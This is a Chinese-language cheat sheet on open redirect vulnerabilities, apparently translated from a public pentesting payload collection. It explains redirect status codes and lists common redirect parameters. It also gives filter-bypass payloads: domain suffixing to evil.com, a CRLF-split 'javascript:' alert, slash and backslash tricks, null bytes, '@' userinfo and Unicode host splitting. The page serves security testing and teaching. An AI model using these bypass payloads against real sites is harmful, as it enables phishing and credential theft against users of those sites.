# 开放重定向漏洞

> 当一个Web应用程序接受不受信任的输入并据此重定向请求到包含在不受信任输入中的URL时，就可能发生未验证的重定向和转发。通过修改不受信任的URL输入为恶意站点，攻击者可以成功发起网络钓鱼攻击并窃取用户凭据。由于修改后的链接中的服务器名称与原始站点相同，网络钓鱼尝试可能显得更加可信。未验证的重定向和转发攻击也可以被用来恶意构造一个可以通过应用程序访问控制检查的URL，然后将攻击者转发到他们通常无法访问的特权功能。

## 概述

* [方法论](#方法论)
    * [HTTP重定向状态码](#http-重定向状态码)
    * [重定向方法](#重定向方法)
        * [基于路径的重定向](#基于路径的重定向)
        * [基于JavaScript的重定向](#基于-javascript-的重定向)
        * [常见查询参数](#常见查询参数)
    * [过滤器绕过](#过滤器绕过)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 方法论

开放重定向漏洞发生在当Web应用程序或服务器使用未经验证的、由用户提供的输入来重定向用户到其他站点时。这使得攻击者能够构造一个指向易受攻击站点的链接，该链接会重定向到攻击者选择的恶意站点。

攻击者可以利用此漏洞进行网络钓鱼活动、会话劫持或强制用户在未经同意的情况下执行操作。

**示例**：一个Web应用程序有一个功能，允许用户点击链接并自动重定向到保存的首选主页。这可能实现如下：

```powershell
https://example.com/redirect?url=https://userpreferredsite.com
```

攻击者可以通过将`userpreferredsite.com`替换为恶意网站的链接来利用此处的开放重定向。然后，他们可以在网络钓鱼邮件中分发此链接或将其发布在其他网站上。当用户点击链接时，他们会被带到恶意网站。

## HTTP重定向状态码

HTTP重定向状态码，那些以3开头的状态码，表示客户端必须采取额外行动才能完成请求。以下是一些最常见的状态码：

* [300多种选择](https://httpstatuses.com/300) - 这表示请求有多个可能的响应。客户端应从中选择一个。
* [301永久移动](https://httpstatuses.com/301) - 这意味着所请求的资源已被永久移动到Location头部给出的URL。所有未来的请求都应该使用新的URI。
* [302找到](https://httpstatuses.com/302) - 这个响应代码表示所请求的资源已被临时移动到Location头部给出的URL。与301不同，它并不意味着资源已被永久移动，只是暂时位于其他地方。
* [303查看其他](https://httpstatuses.com/303) - 服务器发送此响应以指导客户端使用GET请求在另一个URI获取所请求的资源。
* [304未修改](https://httpstatuses.com/304) - 这用于缓存目的。它告诉客户端响应没有被修改，因此客户端可以继续使用相同的缓存版本的响应。
* [305使用代理](https://httpstatuses.com/305) - 所请求的资源必须通过Location头部提供的代理访问。
* [307临时重定向](https://httpstatuses.com/307) - 这意味着所请求的资源已被临时移动到Location头部给出的URL，并且未来的请求仍应使用原始URI。
* [308永久重定向](https://httpstatuses.com/308) - 这意味着资源已被永久移动到Location头部给出的URL，并且未来的请求应使用新的URI。它类似于301，但不允许更改HTTP方法。

## 重定向方法

### 基于路径的重定向

除了查询参数外，重定向逻辑可能依赖于路径：

* 在URL中使用斜杠：`https://example.com/redirect/http://malicious.com`
* 注入相对路径：`https://example.com/redirect/../http://malicious.com`

### 基于JavaScript的重定向

如果应用程序使用JavaScript进行重定向，攻击者可能会操纵脚本变量：

**示例**：

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**负载**：`?redirectTo=http://malicious.com`

### 常见查询参数

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

## 过滤器绕过

* 使用白名单域名或关键字

    ```powershell
    www.whitelisted.com.evil.com 重定向到 evil.com
    ```

* 使用**CRLF**绕过黑名单中的“javascript”关键字

    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* 使用"`//`"和"`////`"绕过黑名单中的“http”

    ```powershell
    //google.com
    ////google.com
    ```

* 使用“https:”绕过黑名单中的“//”

    ```powershell
    https:google.com
    ```

* 使用"`\/\/`"绕过黑名单中的“//”

    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* 使用"`%E3%80%82`"绕过黑名单中的“.”

    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* 使用null字节"`%00`"绕过黑名单过滤器

    ```powershell
    //google%00.com
    ```

* 使用HTTP参数污染

    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* 使用"@"字符。[通用Internet方案语法](https://datatracker.ietf.org/doc/html/rfc1738)

    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* 创建文件夹作为他们的域名

    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* 使用"`?`"字符，浏览器会将其转换为"`/?`"

    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* 主机/分割Unicode规范化

    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```

## 实验室

* [Root Me - HTTP - 开放重定向](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - 基于DOM的开放重定向](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

## 参考文献

* [Unicode规范化中的主机/分割可利用模式 - Jonathan Birch - 2019年8月3日](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
* [开放重定向速查表 - PentesterLand - 2018年11月2日](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [开放重定向漏洞 - s0cket7 - 2018年8月15日](https://s0cket7.com/open-redirect-vulnerability/)
* [Open-Redirect-Payloads - Predrag Cujanović - 2017年4月24日](https://github.com/cujanovic/Open-Redirect-Payloads)
* [未验证的重定向和转发速查表 - OWASP - 2024年2月28日](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [你不需要运行80种侦察工具就能获得对用户帐户的访问权限 - Stefano Vettorazzi (@stefanocoding) - 2019年5月16日](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)